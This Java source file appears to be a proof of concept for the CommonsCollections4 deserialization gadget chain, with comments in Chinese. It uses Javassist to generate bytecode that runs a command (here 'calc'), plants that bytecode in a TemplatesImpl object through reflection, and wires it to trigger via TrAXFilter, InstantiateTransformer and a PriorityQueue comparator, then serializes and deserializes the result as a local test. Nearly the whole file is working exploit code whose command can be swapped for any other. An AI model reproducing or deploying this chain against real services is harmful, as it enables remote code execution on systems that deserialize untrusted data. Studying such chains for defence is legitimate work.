package mypoc.CCExp;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4 {
    public static void setFileValue(Object object, String fileName, Object value) throws Exception {
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field declaredField = templatesClass.getDeclaredField(fileName);
        declaredField.setAccessible(true);
        declaredField.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        // 生成恶意字节码文件
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc4 = pool.makeClass("CC4");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        // 加载static代码块
        cc4.makeClassInitializer().insertBefore(cmd);
        // 设置父类
        cc4.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = cc4.toBytecode();
        byte[][] evilBytes = new byte[][]{bytes};

        // 恶意TemplateImpl
        TemplatesImpl templates = new TemplatesImpl();
        // 反射修改成员变量
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        setFileValue(templates, "_name", "CC4");
        setFileValue(templates, "_class", null);
        setFileValue(templates, "_bytecodes", evilBytes);
        // 构造好了恶意的TemplateImpl对象templates

        //
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(1);
        // 增加size
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        // 反射修改构造好的comparator
        Field comparator = priorityQueueClass.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, transformingComparator);
        // 没有必要修改queue

        // 本地测试
        ByteArrayOutputStream byteArrayOutputStream = ToolClass.serializeData(priorityQueue);
        System.out.println(byteArrayOutputStream);
        ToolClass.unserializeData(byteArrayOutputStream);

    }
}
